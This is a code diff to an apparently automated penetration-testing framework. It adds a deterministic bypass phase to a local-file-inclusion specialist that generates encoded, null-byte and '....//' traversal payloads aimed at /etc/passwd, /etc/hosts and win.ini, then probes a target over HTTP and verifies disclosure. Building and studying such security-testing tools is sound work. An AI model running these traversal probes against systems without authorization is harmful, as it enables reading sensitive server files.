@@ -15,7 +15,10 @@ from penage.llm.base import LLMClient
 from penage.memory.store import MemoryStore
 from penage.specialists.base import AsyncSpecialist, SpecialistConfig
 from penage.specialists.shared.oob_listener import OobListener
-from penage.specialists.shared.path_traversal import detect_lfi_markers
+from penage.specialists.shared.path_traversal import (
+    detect_lfi_markers,
+    generate_traversal_variants,
+)
 from penage.tools.http_backend import HttpBackend
 
 logger = logging.getLogger(__name__)
@@ -114,7 +117,13 @@ class LfiSpecialist(AsyncSpecialist):
        response body is scanned with
        :func:`penage.specialists.shared.path_traversal.detect_lfi_markers`.
        The first family-specific marker wins — the finding is verified.
-    3. **Bypass variants (LLM + wider traversal).** Next session (2.6c).
+    3. **Deterministic bypass variants.** Interleaved output of
+       :func:`generate_traversal_variants` over well-known target files
+       (``/etc/passwd``, ``/etc/hosts``, ``C:\\Windows\\win.ini``) and the
+       ``bypass`` category of ``lfi.yaml``. Priority order inside the
+       generated set puts double-URL-encoded forms first, then single-URL,
+       then ``....//``, then null-byte, then raw. LLM-driven mutation is
+       added in session 2.6c-iii.
     4. **OOB (php://input, file:// OOB-host for RCE-chain).** Next session.
     5. **Candidate emission and finalization.** Next session.
 
@@ -191,7 +200,25 @@ class LfiSpecialist(AsyncSpecialist):
                 self._attempted.add(key)
                 break
 
-            # Phases 3-5 are implemented in the next session (2.6c).
+            # Phase 3 — deterministic bypass variants.
+            if budgeted.remaining >= self.min_reserve_http:
+                self._trace_phase(
+                    3, "bypass_deterministic", step=step, target=target
+                )
+                bypass_finding = await self._run_bypass_phase(
+                    target=target,
+                    http_tool=budgeted,
+                    host=host,
+                    config=config,
+                    step=step,
+                )
+                if bypass_finding and bypass_finding.get("verified"):
+                    self._findings.append(bypass_finding)
+                    self._done = True
+                    self._attempted.add(key)
+                    break
+
+            # Phases 4 and 5 are implemented in later sessions (2.6c-iii/iv).
             self._attempted.add(key)
 
         return self._emit_if_any()
@@ -308,8 +335,142 @@ class LfiSpecialist(AsyncSpecialist):
         config: SpecialistConfig,
         step: int,
     ) -> dict[str, Any] | None:
-        """Phase 3: LLM + wider traversal bypass variants."""
-        raise NotImplementedError("Implemented in 2.6c")
+        """Phase 3: deterministic bypass variants.
+
+        Two sources interleaved:
+
+        * **A.** :func:`generate_traversal_variants` for three well-known
+          target files (``/etc/passwd``, ``/etc/hosts`` and
+          ``C:\\Windows\\win.ini``). Variants are deduplicated then sorted
+          by a priority that puts the most filter-evading forms first:
+          double-URL-encoded → URL-encoded → ``....//`` → null-byte → raw.
+        * **B.** ``lfi.yaml`` entries with ``category == "bypass"`` (already
+          includes encoded / null-byte / mixed-slash forms).
+
+        The two streams are interleaved with A first in each pair so the
+        most valuable filter-bypass forms race ahead of the yaml list.
+        The combined candidate set is capped at ``max_bypass_payloads * 2``
+        to keep this phase from swallowing the whole HTTP budget.
+
+        LLM-driven mutation is added in session 2.6c-iii; until then this
+        method returns ``None`` when nothing is verified deterministically.
+        """
+        _ = (config, step)
+
+        well_known = [
+            "/etc/passwd",
+            "/etc/hosts",
+            "C:\\Windows\\win.ini",
+        ]
+        a_variants: list[str] = []
+        for target_file in well_known:
+            a_variants.extend(
+                generate_traversal_variants(target_file, max_depth=8)
+            )
+
+        def _bypass_priority(payload: str) -> int:
+            if "%252e" in payload or "%252f" in payload:
+                return 1  # double-encoded — most valuable
+            if "%2e%2e" in payload or "%2f" in payload:
+                return 2  # url-encoded
+            if "....//" in payload or "....\\\\" in payload:
+                return 3  # filter bypass
+            if "%00" in payload:
+                return 4  # nullbyte
+            return 5  # raw — phase 2 already tried plain forms
+
+        a_variants_sorted = sorted(set(a_variants), key=_bypass_priority)
+
+        b_entries = self._load_yaml_entries(categories=("bypass",), limit=4)
+        b_variants = [str(e["payload"]) for e in b_entries]
+
+        cap = self.max_bypass_payloads * 2
+        candidates: list[str] = []
+        seen: set[str] = set()
+        for batch in zip(a_variants_sorted, b_variants):
+            for p in batch:
+                if p in seen:
+                    continue
+                seen.add(p)
+                candidates.append(p)
+        for p in a_variants_sorted[len(b_variants):]:
+            if p not in seen:
+                seen.add(p)
+                candidates.append(p)
+        candidates = candidates[:cap]
+
+        deterministic_tried = 0
+        for payload in candidates:
+            if http_tool.remaining < 2:
+                break
+            deterministic_tried += 1
+
+            probe_url, action_params = _build_probe_action(target, payload)
+            action = Action(type=ActionType.HTTP, params=action_params)
+            obs = await http_tool.run(action)
+
+            if not obs.ok or not isinstance(obs.data, dict):
+                self._record_attempt(
+                    host=host,
+                    parameter=target.parameter,
+                    payload=payload,
+                    outcome="error",
+                )
+                continue
+
+            body = str(obs.data.get("text_full") or "")
+            status = obs.data.get("status_code")
+            hits = detect_lfi_markers(body)
+
+            if hits:
+                primary = hits[0]
+                self._record_attempt(
+                    host=host,
+                    parameter=target.parameter,
+                    payload=payload,
+                    outcome="verified_bypass",
+                )
+                return {
+                    "verified": True,
+                    "kind": "lfi_bypass_verified",
+                    "mode": "bypass",
+                    "parameter": target.parameter,
+                    "payload": payload,
+                    "channel": target.channel,
+                    "url": probe_url,
+                    "family": primary.family.value,
+                    "evidence": {
+                        "markers": [
+                            {
+                                "family": h.family.value,
+                                "marker": h.marker,
+                                "snippet": h.snippet,
+                            }
+                            for h in hits[:5]
+                        ],
+                        "response_excerpt": body[:500],
+                        "http_status": status,
+                        "bypass_source": (
+                            "yaml" if payload in b_variants else "generated"
+                        ),
+                    },
+                    "summary": (
+                        f"LFI bypass disclosure of {primary.family.value} "
+                        f"via {target.parameter}"
+                    ),
+                }
+
+            self._record_attempt(
+                host=host,
+                parameter=target.parameter,
+                payload=payload,
+                outcome="no_signal",
+            )
+
+        self._note(
+            f"lfi:bypass_phase_no_verified deterministic_tried={deterministic_tried}"
+        )
+        return None
 
     async def _run_oob_phase(
         self,
